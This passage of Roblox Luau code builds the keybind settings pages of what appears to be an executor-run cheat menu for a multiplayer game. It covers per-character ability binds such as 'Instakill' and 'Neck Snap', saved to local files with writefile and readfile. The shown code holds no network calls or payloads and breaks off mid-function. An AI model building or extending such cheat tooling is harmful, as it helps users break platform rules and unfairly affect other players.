LaserCompatibilityLabel.TextXAlignment = Enum.TextXAlignment.Left
LaserCompatibilityLabel.Parent = Page2Scroll
do
	local row = Instance.new("Frame")
	row.Name = "DeviceRow"
	row.Size = UDim2.new(1, -10, 0, 24)
	row.Position = UDim2.new(0, 5, 0, 434)
	row.BackgroundTransparency = 1
	row.Parent = Page2Scroll
	local pcGroup = Instance.new("Frame")
	pcGroup.Name = "PcGroup"
	pcGroup.Size = UDim2.new(0.5, -4, 1, 0)
	pcGroup.Position = UDim2.new(0, 0, 0, 0)
	pcGroup.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	pcGroup.BorderSizePixel = 0
	pcGroup.ClipsDescendants = true
	pcGroup.Parent = row
	local pcGroupCorner = Instance.new("UICorner")
	pcGroupCorner.CornerRadius = UDim.new(0, 4)
	pcGroupCorner.Parent = pcGroup
	local gear = Instance.new("TextButton")
	gear.Name = "PcSettingsBtn"
	gear.Size = UDim2.new(0, 24, 1, 0)
	gear.Position = UDim2.new(0, 0, 0, 0)
	gear.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	gear.BorderSizePixel = 0
	gear.TextColor3 = Color3.fromRGB(230, 230, 230)
	gear.Font = Enum.Font.GothamBold
	gear.TextSize = 14
	gear.Text = "⚙"
	gear.AutoButtonColor = true
	gear.Parent = pcGroup
	local split = Instance.new("Frame")
	split.Name = "PcSplit"
	split.Size = UDim2.new(0, 1, 1, -6)
	split.Position = UDim2.new(0, 24, 0, 3)
	split.BackgroundColor3 = Color3.fromRGB(88, 88, 88)
	split.BorderSizePixel = 0
	split.ZIndex = 2
	split.Parent = pcGroup
	local left = Instance.new("TextButton")
	left.Name = "PcModeBtn"
	left.Size = UDim2.new(1, -25, 1, 0)
	left.Position = UDim2.new(0, 25, 0, 0)
	left.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	left.BorderSizePixel = 0
	left.TextColor3 = Color3.fromRGB(255, 255, 255)
	left.Font = Enum.Font.GothamBold
	left.TextSize = 11
	left.TextScaled = false
	left.TextWrapped = false
	left.TextXAlignment = Enum.TextXAlignment.Center
	left.Text = "Pc"
	left.Parent = pcGroup
	local right = Instance.new("TextButton")
	right.Name = "MobileModeBtn"
	right.Size = UDim2.new(0.5, -4, 1, 0)
	right.Position = UDim2.new(0.5, 4, 0, 0)
	right.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	right.TextColor3 = Color3.fromRGB(255, 255, 255)
	right.Font = Enum.Font.GothamBold
	right.TextSize = 11
	right.TextScaled = false
	right.TextWrapped = false
	right.TextXAlignment = Enum.TextXAlignment.Center
	right.Text = "mobile"
	right.Parent = row
	local rc = Instance.new("UICorner")
	rc.CornerRadius = UDim.new(0, 4)
	rc.Parent = right
	local function paintPc(on)
	local col = on and Color3.fromRGB(70, 70, 70) or Color3.fromRGB(45, 45, 45)
	pcGroup.BackgroundColor3 = col
	gear.BackgroundColor3 = col
	left.BackgroundColor3 = col
	end
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	paintPc(true)
	else
	right.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	end
	local settingsPage = Main:FindFirstChild("PageSettings")
	if not settingsPage then
	settingsPage = Instance.new("Frame")
	settingsPage.Name = "PageSettings"
	settingsPage.Size = UDim2.new(1, 0, 1, -62)
	settingsPage.Position = UDim2.new(0, 0, 0, 62)
	settingsPage.BackgroundTransparency = 1
	settingsPage.Visible = false
	settingsPage.Parent = Main
	local sc = Instance.new("ScrollingFrame")
	sc.Name = "SettingsScroll"
	sc.Size = UDim2.new(1, 0, 1, 0)
	sc.BackgroundTransparency = 1
	sc.BorderSizePixel = 0
	sc.ScrollBarThickness = 4
	sc.CanvasSize = UDim2.new(0, 0, 0, 420)
	sc.Parent = settingsPage
	local back = Instance.new("TextButton")
	back.Size = UDim2.new(0, 52, 0, 20)
	back.Position = UDim2.new(0, 5, 0, 4)
	back.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	back.TextColor3 = Color3.fromRGB(230, 230, 230)
	back.Font = Enum.Font.GothamBold
	back.TextSize = 10
	back.Text = "Back"
	back.Parent = sc
	Instance.new("UICorner", back).CornerRadius = UDim.new(0, 4)
	back.MouseButton1Click:Connect(function()
	settingsPage.Visible = false
	Page2.Visible = true
	end)
	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, -62, 0, 20)
	title.Position = UDim2.new(0, 58, 0, 4)
	title.BackgroundTransparency = 1
	title.Text = "Pc Settings"
	title.TextColor3 = Color3.fromRGB(230, 230, 230)
	title.Font = Enum.Font.GothamBold
	title.TextSize = 12
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = sc
	local row1 = Instance.new("Frame")
	row1.Name = "MenuBindRow"
	row1.Size = UDim2.new(1, -10, 0, 36)
	row1.Position = UDim2.new(0, 5, 0, 30)
	row1.BackgroundTransparency = 1
	row1.Parent = sc
	local lab1 = Instance.new("TextLabel")
	lab1.Size = UDim2.new(1, -38, 1, 0)
	lab1.Position = UDim2.new(0, 0, 0, 0)
	lab1.BackgroundTransparency = 1
	lab1.Text = "Open / Minimize menu"
	lab1.TextColor3 = Color3.fromRGB(220, 220, 220)
	lab1.Font = Enum.Font.Gotham
	lab1.TextSize = 10
	lab1.TextWrapped = true
	lab1.TextXAlignment = Enum.TextXAlignment.Left
	lab1.TextYAlignment = Enum.TextYAlignment.Center
	lab1.Parent = row1
	local box1 = Instance.new("TextBox")
	box1.Name = "MenuBindBox"
	box1.Size = UDim2.new(0, 32, 0, 22)
	box1.Position = UDim2.new(1, -32, 0.5, -11)
	box1.BackgroundColor3 = Color3.fromRGB(32, 32, 36)
	box1.BorderSizePixel = 0
	box1.Text = "U"
	box1.PlaceholderText = "U"
	box1.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
	box1.TextColor3 = Color3.fromRGB(240, 240, 240)
	box1.Font = Enum.Font.GothamBold
	box1.TextSize = 12
	box1.TextXAlignment = Enum.TextXAlignment.Center
	box1.ClearTextOnFocus = true
	box1.TextEditable = true
	box1.MultiLine = false
	box1.Parent = row1
	Instance.new("UICorner", box1).CornerRadius = UDim.new(0, 4)
	local stroke1 = Instance.new("UIStroke")
	stroke1.Color = Color3.fromRGB(80, 80, 88)
	stroke1.Thickness = 1
	stroke1.Parent = box1
	local applyingBind = false
	local function applyMenuBind(raw, keepIfEmpty, doSave)
	local s = string.upper(tostring(raw or ""))
	s = string.gsub(s, "[^A-Z0-9]", "")
	s = string.sub(s, 1, 1)
	if s == "" then
	if keepIfEmpty then
	return nil
	end
	s = LocalPlayer:GetAttribute("YYDSMenuBind") or "U"
	end
	applyingBind = true
	box1.Text = s
	applyingBind = false
	LocalPlayer:SetAttribute("YYDSMenuBind", s)
	if doSave == true then
	pcall(function()
	writefile("yyds_pcset_dev_v2.txt", s)
	end)
	end
	return s
	end
	applyMenuBind(LocalPlayer:GetAttribute("YYDSMenuBind") or "U", false, false)
	box1.FocusLost:Connect(function()
	applyMenuBind(box1.Text, false, true)
	end)
	box1:GetPropertyChangedSignal("Text"):Connect(function()
	if applyingBind then
	return
	end
	local s = applyMenuBind(box1.Text, true, true)
	if s then
	pcall(function()
	box1:ReleaseFocus()
	end)
	end
	end)
	local bindSub = Instance.new("Frame")
	bindSub.Name = "BindSub"
	bindSub.Size = UDim2.new(1, 0, 1, 0)
	bindSub.BackgroundTransparency = 1
	bindSub.Visible = false
	bindSub.Parent = settingsPage
	local subBack = Instance.new("TextButton")
	subBack.Size = UDim2.new(0, 52, 0, 20)
	subBack.Position = UDim2.new(0, 5, 0, 4)
	subBack.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	subBack.TextColor3 = Color3.fromRGB(230, 230, 230)
	subBack.Font = Enum.Font.GothamBold
	subBack.TextSize = 10
	subBack.Text = "Back"
	subBack.Parent = bindSub
	Instance.new("UICorner", subBack).CornerRadius = UDim.new(0, 4)
	local subTitle = Instance.new("TextLabel")
	subTitle.Name = "BindTitle"
	subTitle.Size = UDim2.new(1, -62, 0, 20)
	subTitle.Position = UDim2.new(0, 58, 0, 4)
	subTitle.BackgroundTransparency = 1
	subTitle.Text = ""
	subTitle.TextColor3 = Color3.fromRGB(230, 230, 230)
	subTitle.Font = Enum.Font.GothamBold
	subTitle.TextSize = 11
	subTitle.TextXAlignment = Enum.TextXAlignment.Left
	subTitle.Parent = bindSub
	local bindBody = Instance.new("Frame")
	bindBody.Name = "BindBody"
	bindBody.Size = UDim2.new(1, -10, 1, -30)
	bindBody.Position = UDim2.new(0, 5, 0, 28)
	bindBody.BackgroundTransparency = 1
	bindBody.Parent = bindSub
	subBack.MouseButton1Click:Connect(function()
	bindSub.Visible = false
	sc.Visible = true
	end)
	local fold = Instance.new("Frame")
	fold.Name = "ModeBindFold"
	fold.Size = UDim2.new(1, -10, 0, 24)
	fold.Position = UDim2.new(0, 5, 0, 72)
	fold.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	fold.Parent = sc
	Instance.new("UICorner", fold).CornerRadius = UDim.new(0, 4)
	local foldLab = Instance.new("TextLabel")
	foldLab.Size = UDim2.new(1, -28, 1, 0)
	foldLab.Position = UDim2.new(0, 6, 0, 0)
	foldLab.BackgroundTransparency = 1
	foldLab.Text = "Mode keybinds"
	foldLab.TextColor3 = Color3.fromRGB(220, 220, 220)
	foldLab.Font = Enum.Font.Gotham
	foldLab.TextSize = 10
	foldLab.TextXAlignment = Enum.TextXAlignment.Left
	foldLab.Parent = fold
	local foldAr = Instance.new("TextButton")
	foldAr.Size = UDim2.new(0, 22, 0, 20)
	foldAr.Position = UDim2.new(1, -24, 0.5, -10)
	foldAr.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	foldAr.TextColor3 = Color3.fromRGB(230, 230, 230)
	foldAr.Font = Enum.Font.GothamBold
	foldAr.TextSize = 12
	foldAr.Text = "v"
	foldAr.Parent = fold
	Instance.new("UICorner", foldAr).CornerRadius = UDim.new(0, 4)
	local charNames = {"Homelander", "A-Train", "Kira", "Deadpool", "Wolverine", "Michael Myers"}
	local charCols = {
	Color3.fromRGB(255, 0, 60),
	Color3.fromRGB(0, 122, 184),
	Color3.fromRGB(138, 149, 165),
	Color3.fromRGB(140, 17, 17),
	Color3.fromRGB(214, 158, 28),
	Color3.fromRGB(138, 149, 165)
	}
	local charRows = {}
	local folded = true
	for i = 1, #charNames do
	local nm = charNames[i]
	local row = Instance.new("Frame")
	row.Size = UDim2.new(1, -10, 0, 24)
	row.Position = UDim2.new(0, 5, 0, 98 + (i - 1) * 26)
	row.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	row.Visible = false
	row.Parent = sc
	Instance.new("UICorner", row).CornerRadius = UDim.new(0, 4)
	charRows[i] = row
	local lab = Instance.new("TextLabel")
	lab.Size = UDim2.new(1, -28, 1, 0)
	lab.Position = UDim2.new(0, 6, 0, 0)
	lab.BackgroundTransparency = 1
	lab.Text = nm
	lab.TextColor3 = Color3.fromRGB(220, 220, 220)
	lab.Font = Enum.Font.Gotham
	lab.TextSize = 10
	lab.TextXAlignment = Enum.TextXAlignment.Left
	lab.Parent = row
	local ar = Instance.new("TextButton")
	ar.Size = UDim2.new(0, 22, 0, 20)
	ar.Position = UDim2.new(1, -24, 0.5, -10)
	ar.BackgroundColor3 = charCols[i]
	ar.TextColor3 = Color3.fromRGB(255, 255, 255)
	ar.Font = Enum.Font.GothamBold
	ar.TextSize = 12
	ar.Text = ">"
	ar.Parent = row
	Instance.new("UICorner", ar).CornerRadius = UDim.new(0, 4)
	ar.MouseButton1Click:Connect(function()
	subTitle.Text = nm
	for _, ch in ipairs(bindBody:GetChildren()) do
	ch:Destroy()
	end
	if nm == "Michael Myers" then
	local skills = {
	{"Open / close panel", "Z"},
	{"MM Life Insure", "X"},
	{"Stalk mode", "T"},
	{"Neck Snap", "R"},
	{"Stab / Hold Stalk", "C"},
	{"Terror Blade", "V"},
	{"Cancel (Stalk)", "R"},
	{"Neck Snap (Stalk)", "B"}
	}
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "M:([A-Z0-9,]+)")
	if body then
	local i = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	i = i + 1
	if skills[i] then
	skills[i][2] = tok
	end
	end
	end
	end
	end)
	for si = 1, #skills do
	local pair = skills[si]
	local line = Instance.new("Frame")
	line.Size = UDim2.new(1, 0, 0, 24)
	line.Position = UDim2.new(0, 0, 0, (si - 1) * 26)
	line.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	line.Parent = bindBody
	Instance.new("UICorner", line).CornerRadius = UDim.new(0, 4)
	local sl = Instance.new("TextLabel")
	sl.Size = UDim2.new(1, -40, 1, 0)
	sl.Position = UDim2.new(0, 6, 0, 0)
	sl.BackgroundTransparency = 1
	sl.Text = pair[1]
	sl.TextColor3 = Color3.fromRGB(220, 220, 220)
	sl.Font = Enum.Font.Gotham
	sl.TextSize = 10
	sl.TextXAlignment = Enum.TextXAlignment.Left
	sl.Parent = line
	local kb = Instance.new("TextBox")
	kb.Size = UDim2.new(0, 28, 0, 20)
	kb.Position = UDim2.new(1, -30, 0.5, -10)
	kb.BackgroundColor3 = Color3.fromRGB(32, 32, 36)
	kb.BorderSizePixel = 0
	kb.TextColor3 = Color3.fromRGB(240, 240, 240)
	kb.Font = Enum.Font.GothamBold
	kb.TextSize = 11
	kb.Text = pair[2]
	kb.PlaceholderText = pair[2]
	kb.ClearTextOnFocus = true
	kb.TextXAlignment = Enum.TextXAlignment.Center
	kb.Parent = line
	Instance.new("UICorner", kb).CornerRadius = UDim.new(0, 4)
	kb:GetPropertyChangedSignal("Text"):Connect(function()
	local s = string.upper(tostring(kb.Text or ""))
	s = string.gsub(s, "[^A-Z0-9]", "")
	s = string.sub(s, 1, 1)
	if s == "" then
	return
	end
	kb.Text = s
	pcall(function()
	kb:ReleaseFocus()
	end)
	pcall(function()
	local parts = {}
	for _, ch in ipairs(bindBody:GetChildren()) do
	if ch:IsA("Frame") then
	local bx = ch:FindFirstChildWhichIsA("TextBox")
	if bx then
	table.insert(parts, string.sub(string.upper(tostring(bx.Text or "")), 1, 1))
	end
	end
	end
	local raw = ""
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	end
	if string.find(raw, "M:") then
	raw = string.gsub(raw, "M:[A-Z0-9,]*", "M:" .. table.concat(parts, ","))
	else
	if raw ~= "" then
	raw = raw .. "\n"
	end
	raw = raw .. "M:" .. table.concat(parts, ",")
	end
	writefile("yyds_modebind_dev_v3.txt", raw)
	end)
	end)
	end
	local rst = Instance.new("TextButton")
	rst.Size = UDim2.new(1, 0, 0, 22)
	rst.Position = UDim2.new(0, 0, 0, #skills * 26 + 6)
	rst.BackgroundColor3 = Color3.fromRGB(70, 40, 40)
	rst.TextColor3 = Color3.fromRGB(255, 255, 255)
	rst.Font = Enum.Font.GothamBold
	rst.TextSize = 10
	rst.Text = "Reset Michael Myers"
	rst.Parent = bindBody
	Instance.new("UICorner", rst).CornerRadius = UDim.new(0, 4)
	rst.MouseButton1Click:Connect(function()
	local defs = {"Z", "X", "T", "R", "C", "V", "R", "B"}
	local n = 0
	for _, ch in ipairs(bindBody:GetChildren()) do
	if ch:IsA("Frame") then
	n = n + 1
	local bx = ch:FindFirstChildWhichIsA("TextBox")
	if bx and defs[n] then
	bx.Text = defs[n]
	end
	end
	end
	pcall(function()
	local raw = ""
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	end
	if string.find(raw, "M:") then
	raw = string.gsub(raw, "M:[A-Z0-9,]*", "M:Z,X,T,R,C,V,R,B")
	else
	if raw ~= "" then
	raw = raw .. "\n"
	end
	raw = raw .. "M:Z,X,T,R,C,V,R,B"
	end
	writefile("yyds_modebind_dev_v3.txt", raw)
	end)
	end)
	end
	if nm == "Wolverine" then
	local skills = {
	{"Life Insure", "V"},
	{"Life / auto-run menu", "R"},
	{"Pounce", "C"}
	}
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "W:([A-Z0-9,]+)")
	if body then
	local i = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	i = i + 1
	if skills[i] then
	skills[i][2] = tok
	end
	end
	end
	end
	end)
	for si = 1, #skills do
	local pair = skills[si]
	local line = Instance.new("Frame")
	line.Size = UDim2.new(1, 0, 0, 24)
	line.Position = UDim2.new(0, 0, 0, (si - 1) * 26)
	line.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	line.Parent = bindBody
	Instance.new("UICorner", line).CornerRadius = UDim.new(0, 4)
	local sl = Instance.new("TextLabel")
	sl.Size = UDim2.new(1, -40, 1, 0)
	sl.Position = UDim2.new(0, 6, 0, 0)
	sl.BackgroundTransparency = 1
	sl.Text = pair[1]
	sl.TextColor3 = Color3.fromRGB(220, 220, 220)
	sl.Font = Enum.Font.Gotham
	sl.TextSize = 10
	sl.TextXAlignment = Enum.TextXAlignment.Left
	sl.Parent = line
	local kb = Instance.new("TextBox")
	kb.Size = UDim2.new(0, 28, 0, 20)
	kb.Position = UDim2.new(1, -30, 0.5, -10)
	kb.BackgroundColor3 = Color3.fromRGB(32, 32, 36)
	kb.BorderSizePixel = 0
	kb.TextColor3 = Color3.fromRGB(240, 240, 240)
	kb.Font = Enum.Font.GothamBold
	kb.TextSize = 11
	kb.Text = pair[2]
	kb.PlaceholderText = pair[2]
	kb.ClearTextOnFocus = true
	kb.TextXAlignment = Enum.TextXAlignment.Center
	kb.Parent = line
	Instance.new("UICorner", kb).CornerRadius = UDim.new(0, 4)
	kb:GetPropertyChangedSignal("Text"):Connect(function()
	local s = string.upper(tostring(kb.Text or ""))
	s = string.gsub(s, "[^A-Z0-9]", "")
	s = string.sub(s, 1, 1)
	if s == "" then
	return
	end
	kb.Text = s
	pcall(function()
	kb:ReleaseFocus()
	end)
	pcall(function()
	local parts = {}
	for _, ch in ipairs(bindBody:GetChildren()) do
	if ch:IsA("Frame") then
	local bx = ch:FindFirstChildWhichIsA("TextBox")
	if bx then
	table.insert(parts, string.sub(string.upper(tostring(bx.Text or "")), 1, 1))
	end
	end
	end
	local raw = ""
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	end
	if string.find(raw, "W:") then
	raw = string.gsub(raw, "W:[A-Z0-9,]*", "W:" .. table.concat(parts, ","))
	else
	if raw ~= "" then
	raw = raw .. "\n"
	end
	raw = raw .. "W:" .. table.concat(parts, ",")
	end
	writefile("yyds_modebind_dev_v3.txt", raw)
	end)
	end)
	end
	local rst = Instance.new("TextButton")
	rst.Size = UDim2.new(1, 0, 0, 22)
	rst.Position = UDim2.new(0, 0, 0, #skills * 26 + 6)
	rst.BackgroundColor3 = Color3.fromRGB(70, 40, 40)
	rst.TextColor3 = Color3.fromRGB(255, 255, 255)
	rst.Font = Enum.Font.GothamBold
	rst.TextSize = 10
	rst.Text = "Reset Wolverine"
	rst.Parent = bindBody
	Instance.new("UICorner", rst).CornerRadius = UDim.new(0, 4)
	rst.MouseButton1Click:Connect(function()
	local defs = {"V", "R", "C"}
	local n = 0
	for _, ch in ipairs(bindBody:GetChildren()) do
	if ch:IsA("Frame") then
	n = n + 1
	local bx = ch:FindFirstChildWhichIsA("TextBox")
	if bx and defs[n] then
	bx.Text = defs[n]
	end
	end
	end
	pcall(function()
	local raw = ""
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	end
	if string.find(raw, "W:") then
	raw = string.gsub(raw, "W:[A-Z0-9,]*", "W:V,R,C")
	else
	if raw ~= "" then
	raw = raw .. "\n"
	end
	raw = raw .. "W:V,R,C"
	end
	writefile("yyds_modebind_dev_v3.txt", raw)
	end)
	end)
	end
	if nm == "Deadpool" then
	local skills = {
	{"Gun", "X"},
	{"Gun shoot", "C"},
	{"Life Insure", "V"},
	{"Life options", "R"}
	}
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "D:([A-Z0-9,]+)")
	if body then
	local i = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	i = i + 1
	if skills[i] then
	skills[i][2] = tok
	end
	end
	end
	end
	end)
	for si = 1, #skills do
	local pair = skills[si]
	local line = Instance.new("Frame")
	line.Size = UDim2.new(1, 0, 0, 24)
	line.Position = UDim2.new(0, 0, 0, (si - 1) * 26)
	line.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	line.Parent = bindBody
	Instance.new("UICorner", line).CornerRadius = UDim.new(0, 4)
	local sl = Instance.new("TextLabel")
	sl.Size = UDim2.new(1, -40, 1, 0)
	sl.Position = UDim2.new(0, 6, 0, 0)
	sl.BackgroundTransparency = 1
	sl.Text = pair[1]
	sl.TextColor3 = Color3.fromRGB(220, 220, 220)
	sl.Font = Enum.Font.Gotham
	sl.TextSize = 10
	sl.TextXAlignment = Enum.TextXAlignment.Left
	sl.Parent = line
	local kb = Instance.new("TextBox")
	kb.Size = UDim2.new(0, 28, 0, 20)
	kb.Position = UDim2.new(1, -30, 0.5, -10)
	kb.BackgroundColor3 = Color3.fromRGB(32, 32, 36)
	kb.BorderSizePixel = 0
	kb.TextColor3 = Color3.fromRGB(240, 240, 240)
	kb.Font = Enum.Font.GothamBold
	kb.TextSize = 11
	kb.Text = pair[2]
	kb.PlaceholderText = pair[2]
	kb.ClearTextOnFocus = true
	kb.TextXAlignment = Enum.TextXAlignment.Center
	kb.Parent = line
	Instance.new("UICorner", kb).CornerRadius = UDim.new(0, 4)
	kb:GetPropertyChangedSignal("Text"):Connect(function()
	local s = string.upper(tostring(kb.Text or ""))
	s = string.gsub(s, "[^A-Z0-9]", "")
	s = string.sub(s, 1, 1)
	if s == "" then
	return
	end
	kb.Text = s
	pcall(function()
	kb:ReleaseFocus()
	end)
	pcall(function()
	local parts = {}
	for _, ch in ipairs(bindBody:GetChildren()) do
	if ch:IsA("Frame") then
	local bx = ch:FindFirstChildWhichIsA("TextBox")
	if bx then
	table.insert(parts, string.sub(string.upper(tostring(bx.Text or "")), 1, 1))
	end
	end
	end
	local raw = ""
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	end
	if string.find(raw, "D:") then
	raw = string.gsub(raw, "D:[A-Z0-9,]*", "D:" .. table.concat(parts, ","))
	else
	if raw ~= "" then
	raw = raw .. "\n"
	end
	raw = raw .. "D:" .. table.concat(parts, ",")
	end
	writefile("yyds_modebind_dev_v3.txt", raw)
	end)
	end)
	end
	local rst = Instance.new("TextButton")
	rst.Size = UDim2.new(1, 0, 0, 22)
	rst.Position = UDim2.new(0, 0, 0, #skills * 26 + 6)
	rst.BackgroundColor3 = Color3.fromRGB(70, 40, 40)
	rst.TextColor3 = Color3.fromRGB(255, 255, 255)
	rst.Font = Enum.Font.GothamBold
	rst.TextSize = 10
	rst.Text = "Reset Deadpool"
	rst.Parent = bindBody
	Instance.new("UICorner", rst).CornerRadius = UDim.new(0, 4)
	rst.MouseButton1Click:Connect(function()
	local defs = {"X", "C", "V", "R"}
	local n = 0
	for _, ch in ipairs(bindBody:GetChildren()) do
	if ch:IsA("Frame") then
	n = n + 1
	local bx = ch:FindFirstChildWhichIsA("TextBox")
	if bx and defs[n] then
	bx.Text = defs[n]
	end
	end
	end
	pcall(function()
	local raw = ""
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	end
	if string.find(raw, "D:") then
	raw = string.gsub(raw, "D:[A-Z0-9,]*", "D:X,C,V,R")
	else
	if raw ~= "" then
	raw = raw .. "\n"
	end
	raw = raw .. "D:X,C,V,R"
	end
	writefile("yyds_modebind_dev_v3.txt", raw)
	end)
	end)
	end
	if nm == "A-Train" then
	local skills = {
	{"Flashstrike", "X"},
	{"Ramkill", "C"},
	{"Speed Crash", "V"},
	{"Cancel", "R"},
	{"Finish", "X"}
	}
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "A:([A-Z0-9,]+)")
	if body then
	local i = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	i = i + 1
	if skills[i] then
	skills[i][2] = tok
	end
	end
	end
	end
	end)
	for si = 1, #skills do
	local pair = skills[si]
	local line = Instance.new("Frame")
	line.Size = UDim2.new(1, 0, 0, 24)
	line.Position = UDim2.new(0, 0, 0, (si - 1) * 26)
	line.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	line.Parent = bindBody
	Instance.new("UICorner", line).CornerRadius = UDim.new(0, 4)
	local sl = Instance.new("TextLabel")
	sl.Size = UDim2.new(1, -40, 1, 0)
	sl.Position = UDim2.new(0, 6, 0, 0)
	sl.BackgroundTransparency = 1
	sl.Text = pair[1]
	sl.TextColor3 = Color3.fromRGB(220, 220, 220)
	sl.Font = Enum.Font.Gotham
	sl.TextSize = 10
	sl.TextXAlignment = Enum.TextXAlignment.Left
	sl.Parent = line
	local kb = Instance.new("TextBox")
	kb.Size = UDim2.new(0, 28, 0, 20)
	kb.Position = UDim2.new(1, -30, 0.5, -10)
	kb.BackgroundColor3 = Color3.fromRGB(32, 32, 36)
	kb.BorderSizePixel = 0
	kb.TextColor3 = Color3.fromRGB(240, 240, 240)
	kb.Font = Enum.Font.GothamBold
	kb.TextSize = 11
	kb.Text = pair[2]
	kb.PlaceholderText = pair[2]
	kb.ClearTextOnFocus = true
	kb.TextXAlignment = Enum.TextXAlignment.Center
	kb.Parent = line
	Instance.new("UICorner", kb).CornerRadius = UDim.new(0, 4)
	kb:GetPropertyChangedSignal("Text"):Connect(function()
	local s = string.upper(tostring(kb.Text or ""))
	s = string.gsub(s, "[^A-Z0-9]", "")
	s = string.sub(s, 1, 1)
	if s == "" then
	return
	end
	kb.Text = s
	pcall(function()
	kb:ReleaseFocus()
	end)
	pcall(function()
	local parts = {}
	for _, ch in ipairs(bindBody:GetChildren()) do
	if ch:IsA("Frame") then
	local bx = ch:FindFirstChildWhichIsA("TextBox")
	if bx then
	table.insert(parts, string.sub(string.upper(tostring(bx.Text or "")), 1, 1))
	end
	end
	end
	local raw = ""
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	end
	if string.find(raw, "A:") then
	raw = string.gsub(raw, "A:[A-Z0-9,]*", "A:" .. table.concat(parts, ","))
	else
	if raw ~= "" then
	raw = raw .. "\n"
	end
	raw = raw .. "A:" .. table.concat(parts, ",")
	end
	writefile("yyds_modebind_dev_v3.txt", raw)
	end)
	end)
	end
	local rst = Instance.new("TextButton")
	rst.Size = UDim2.new(1, 0, 0, 22)
	rst.Position = UDim2.new(0, 0, 0, #skills * 26 + 6)
	rst.BackgroundColor3 = Color3.fromRGB(70, 40, 40)
	rst.TextColor3 = Color3.fromRGB(255, 255, 255)
	rst.Font = Enum.Font.GothamBold
	rst.TextSize = 10
	rst.Text = "Reset A-Train"
	rst.Parent = bindBody
	Instance.new("UICorner", rst).CornerRadius = UDim.new(0, 4)
	rst.MouseButton1Click:Connect(function()
	local defs = {"X", "C", "V", "R"}
	local n = 0
	for _, ch in ipairs(bindBody:GetChildren()) do
	if ch:IsA("Frame") then
	n = n + 1
	local bx = ch:FindFirstChildWhichIsA("TextBox")
	if bx and defs[n] then
	bx.Text = defs[n]
	end
	end
	end
	pcall(function()
	local raw = ""
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	end
	if string.find(raw, "A:") then
	raw = string.gsub(raw, "A:[A-Z0-9,]*", "A:X,C,V,R,X")
	else
	if raw ~= "" then
	raw = raw .. "\n"
	end
	raw = raw .. "A:X,C,V,R,X"
	end
	writefile("yyds_modebind_dev_v3.txt", raw)
	end)
	end)
	end
	if nm == "Kira" then
	local skills = {
	{"Death note", "V"},
	{"Instakill", "Z"},
	{"Delay kill", "X"},
	{"Note options", "C"},
	{"Cancel", "R"}
	}
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "K:([A-Z0-9,]+)")
	if body then
	local i = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	i = i + 1
	if skills[i] then
	skills[i][2] = tok
	end
	end
	end
	end
	end)
	for si = 1, #skills do
	local pair = skills[si]
	local line = Instance.new("Frame")
	line.Size = UDim2.new(1, 0, 0, 24)
	line.Position = UDim2.new(0, 0, 0, (si - 1) * 26)
	line.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	line.Parent = bindBody
	Instance.new("UICorner", line).CornerRadius = UDim.new(0, 4)
	local sl = Instance.new("TextLabel")
	sl.Size = UDim2.new(1, -40, 1, 0)
	sl.Position = UDim2.new(0, 6, 0, 0)
	sl.BackgroundTransparency = 1
	sl.Text = pair[1]
	sl.TextColor3 = Color3.fromRGB(220, 220, 220)
	sl.Font = Enum.Font.Gotham
	sl.TextSize = 10
	sl.TextXAlignment = Enum.TextXAlignment.Left
	sl.Parent = line
	local kb = Instance.new("TextBox")
	kb.Size = UDim2.new(0, 28, 0, 20)
	kb.Position = UDim2.new(1, -30, 0.5, -10)
	kb.BackgroundColor3 = Color3.fromRGB(32, 32, 36)
